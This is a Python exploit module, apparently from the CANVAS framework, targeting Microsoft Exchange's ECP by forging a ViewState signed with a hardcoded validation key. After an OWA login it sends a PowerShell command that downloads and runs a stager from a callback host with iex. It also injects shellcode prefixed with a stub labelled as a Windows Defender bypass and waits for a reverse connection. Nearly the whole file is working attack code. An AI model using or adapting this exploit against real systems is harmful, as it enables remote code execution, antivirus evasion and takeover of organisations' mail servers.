import socket
import os
import sys
import yaml
import base64
import logging
import urllib
import urlparse
import hmac
import hashlib

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from libs import spkproxy
from shellcode.standalone.windows.payloads64 import payloads as payloads64
from Nodes.mosdef_powershell.mosdef_powershell import *
from exploitutils import *
from tcpexploit import tcpexploit
#import timeoutsocket

module_path = os.path.dirname(os.path.realpath(__file__))
with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME            = metadata['NAME']
DESCRIPTION     = metadata['DESCRIPTION']
VERSION         = metadata['VERSION']
DOCUMENTATION   = metadata['DOCUMENTATION']
PROPERTY        = metadata['PROPERTY']
TEST_ONLY       = False


def make_encoded_int(number, max_length=5):
    parts = []

    start_mask = (1 << 7) - 1
    mask = start_mask

    for i in range(0, max_length):
        if i == 0:
            pass
        else:
            mask = start_mask + (mask << 7)

        current = number & mask
        number -= current

        added_number = (current >> 7 * i) | ((1 << 7) if number else 0)

        parts.append(added_number)

        if not number:
            break

    return "".join([chr(part) for part in parts])

def read_encoded_int(data):
    # at max, use 5 bytes
    total = 0
    length = 0
    for i in range(0, 5):
        do_next = (ord(data[i]) & 0x80)
        total += (ord(data[i]) & 0x7f) << (7 * i)
        length += 1
        if not do_next:
            break

    return (total, length)

def getencodedcommand(c):
    uc = unicode(c).encode('utf-16le')
    cbytes = bytearray()
    index = 0
    for byte in uc:
        cbytes.insert(index, ord(byte))
        index += 1
    return base64.b64encode(cbytes)

def getViewstate(sessionId, serialized_object, payload):
    serialized_object = serialized_object.replace('XXXX', payload)
    size, l = read_encoded_int(serialized_object[3:])
    size1 = make_encoded_int(size + len(payload) - 4, max_length=l)
    size, l = read_encoded_int(serialized_object[224:])
    size2 = make_encoded_int(size + len(payload) - 4, max_length=l)
    serialized_object = serialized_object[:3] + size1 + serialized_object[5:]
    serialized_object = serialized_object[
        :224] + size2 + serialized_object[226:]
    postfix = '274e7bb9'.decode('hex')
    for c in sessionId:
        postfix += c + chr(0)
    key = 'CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF'.decode('hex')
    mac = hmac.new(key, serialized_object + postfix, hashlib.sha1).digest()
    return base64.b64encode(serialized_object + mac)

def encoded_7bit_int(number, max_length=5):
    parts = []

    start_mask = (1 << 7) - 1
    mask = start_mask

    for i in range(0, max_length):
        if i == 0:
            pass
        else:
            mask = start_mask + (mask << 7)

        current = number & mask
        number -= current

        added_number = (current >> 7 * i) | ((1 << 7) if number else 0)

        parts.append(added_number)

        if not number:
            break

    return "".join([chr(part) for part in parts])

def decoded_7bit_int(data):
    # at max, use 5 bytes
    total = 0
    length = 0
    for i in range(0, 5):
        do_next = (ord(data[i]) & 0x80)
        total += (ord(data[i]) & 0x7f) << (7 * i)
        length += 1
        if not do_next:
            break

    return (total, length)

class theexploit(tcpexploit, object):
    def __init__(self):
        super(theexploit, self).__init__()

        self.local_path = os.path.dirname(__file__)
        self.binaries_path = os.path.join(self.local_path, "Resources")

        self.use_local_interface = False
        self.autoFind = False

    def login(self, vhost, user, pwd):
        url = self.protocol + '//' + vhost
        params = {'passwordText': '', 'isUtf8': '1', 'trusted': '4', 'destination': url,
                  'flags': '4', 'forcedownlevel': '0', 'password': pwd, 'username': user}
        login = self.session.post(
            '/owa/auth.owa', data=params, verify=False, timeout=10)
        if 'cadata' not in self.session.getCookies():
            logging.error(
                'Did not get session cookies. OWA Login incorrect, server not available, or user has never manually logged to OWA')
            return False

        self.session.get("/ecp/default.aspx", verify=False, timeout=10)
        sessionId = self.session.getCookies()['ASP.NET_SessionId']
        if not sessionId:
            logging.error('Did not get SessionId')
            return False
        return sessionId

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self.protocol = 'https:'
        self.remote_host = self.target.interface
        try:
            self.port = int(self.argsDict.get('port'))
        except Exception, e:
            self.port = None
        self.user = self.argsDict.get('user')
        self.pwd = self.argsDict.get('pwd')
        try:
            self.vhost = self.argsDict.get('vhost')
        except Exception, e:
            self.vhost = None

        if not self.vhost:
            self.vhost = self.remote_host
        if not self.port:
            self.port = 443

        if '\\' in self.user:
            self.domain, self.user = self.user.split('\\')
        # logging.info("START GETARGS----------")
        logging.info("Target: " + self.target.interface)
        logging.info('USER: %s' % self.user)
        logging.info('PASSWORD: %s' % self.pwd)
        logging.info('VHOST: %s' % self.vhost)
        # logging.info("END GETARGS----------")

    def get_payload(self, port):
        command = """$x = new-object -comobject "WinHttp.WinHttpRequest.5.1"; $x.Open("GET", "%s", $false); $x.Send(); $y = $x.ResponseText; iex $y""" % (
            "http://" + self.callback.ip + ":" + str(port) + "/" + self.random_string(10))
        return base64.b64encode(command.encode('utf-16le'))

    def setup_webserver(self, shellcode):
        final_port = None

        for port in range(8080, 0xffff):
            ps_stager = self.powershell_stager(shellcode)

            if self.start_webserver(port, ps_stager):
                final_port = port
                break

        logging.info("Set up stager web server on port:%d" % final_port)
        return final_port

    def start_webserver(self, port, stager_data):
        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = port
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["sourcedata"] = stager_data
        ret = app.listen()
        self.server = app

        return ret

    def get_replacers(self, text):
        replacers = set([])
        state = 0
        replacer_allowed_chars = ["_"]
        replacer_allowed_chars.extend(string.ascii_letters)

        current = []

        for i in text:
            if state == 0:
                if i == "{":
                    current.append(i)
                    state = 1
            elif state == 1:
                if i.isspace() or i not in replacer_allowed_chars:
                    state = 0
                    if i == "}":
                        current.append(i)
                        if len(current) != 2:
                            replacers.add("".join(current))
                    current = []
                else:
                    current.append(i)

        return replacers

    def powershell_stager(self, shellcode):
        shellcode_fmt = ''
        for b in shellcode:
            shellcode_fmt += '0x' + b.encode("hex") + ','
        shellcode_fmt = shellcode_fmt[:-1]

        with open(os.path.join(self.binaries_path, 'loadshellcode.ps1'), 'rb') as _:
            execsc = _.read()

        execsc = execsc.replace('MOSDEF', shellcode_fmt)
        return execsc

    def random_string(self, chars=5):
        """
        Return a string that contains CHARS number of random alphabetic
        characters.
        """
        choices = []
        for _ in range(chars):
            choices.append(random.choice(string.ascii_letters))

        return "".join(choices)

    def run(self):
        # timeoutsocket.setDefaultSocketTimeout(30)
        self.getargs()
        self.session = Session(
            '%s//%s:%d/' % (self.protocol, self.remote_host, self.port), self.vhost)

        p = payloads64()
        asm = p.InjectToSelf(self.callback.ip, self.callback.port)
        """ Source of windows defender bypass
        <+0>:	31 c0	xor    %eax,%eax
        <+2>:	bb 00 80 00 00	mov    $0x8000,%ebx
        <+7>:	31 c9	xor    %ecx,%ecx
        <+9>:	ff c1	inc    %ecx
        <+11>:	39 d9	cmp    %ebx,%ecx
        <+13>:	75 fa	jne    0x603 <main+9>
        <+15>:	ff c0	inc    %eax
        <+17>:	39 d8	cmp    %ebx,%eax
        <+19>:	75 f2	jne    0x601 <main+7>
        """
        windows_defender_bypass="\x31\xc0\xbb\x00\x80\x00\x00\x31\xc9\xff\xc1\x39\xd9\x75\xfa\xff\xc0\x39\xd8\x75\xf2"
        shellcode = windows_defender_bypass + p.assemble(asm)

        webserver_port = self.setup_webserver(shellcode)

        sessionId = self.login(self.vhost, self.user, self.pwd)
        if not sessionId:
            return False

        if not TEST_ONLY:
            payload = self.get_payload(webserver_port)
        else:
            # Test payload
            test_cmd = '"Hello World  " | Out-File -FilePath c:\\test'
            payload = getencodedcommand(test_cmd)

        with open(os.path.join(self.binaries_path, "psobject"), "rb") as obj:
            serialized_object = obj.read()[:-20]  # -20 is to remove old hmac

        viewstate = getViewstate(sessionId, serialized_object, payload)
        viewgenerator = "B97B4E27"
        url = "/ecp/default.aspx?__VIEWSTATEGENERATOR=%s&__VIEWSTATE=%s" % (
            viewgenerator, urllib.pathname2url(viewstate))
        status = self.session.get(url, verify=False)
        tries = 0
        while all([(self.state != "HALT"),
                   not self.ISucceeded(),
                   tries < 5]):
            self.server.accept()
            tries += 1

        return True

# spkproxy wrapper with requests like interface
class Session:
    def __init__(self, base_url, hostname):
        self.ua = spkproxy.UserAgent(base_url, hostname=hostname)
        self.ua.addHeader('Content-Type', 'application/x-www-form-urlencoded')
        self.ua.addHeader('Accept', '*/*')
        self.ua.addHeader(
            'User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')

    def getCookies(self):
        return self.ua.cookies

    class Response:
        def __init__(self, status_code, text, url):
            self.text = text
            self.status_code = status_code
            self.url = url

    def getRedirect(self):
        try:
            for l in self.ua.response_head.splitlines():
                if l.startswith('Location:'):
                    url = l.split(':', 1)[1].strip()
                    # we assume that the host its not changing here
                    return urlparse.urlparse(url).path
        except Exception:
            return None

    # verify and timeout are not implemented
    def post(self, url, data, verify, timeout):
        return self.request(url, data, verify, timeout, self.ua.POST)

    def request(self, url, data, verify, timeout, method):
        self.ua.response_head = None
        # we follow up to 5 redirects
        for i in range(5):
            if method == self.ua.POST:
                (res, response_code) = self.ua.POST(
                    url, data, return_response_code=True)
            else:
                (res, response_code) = self.ua.GET(
                    url, return_response_code=True)
            _url = self.getRedirect()
            if _url != None:
                url = _url
                method = self.ua.GET
            else:
                break
        return Session.Response(response_code, res, url)

    # verify and timeout are not implemented
    def get(self, url, verify, timeout=None):
        data = None
        return self.request(url, data, verify, timeout, self.ua.GET)


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
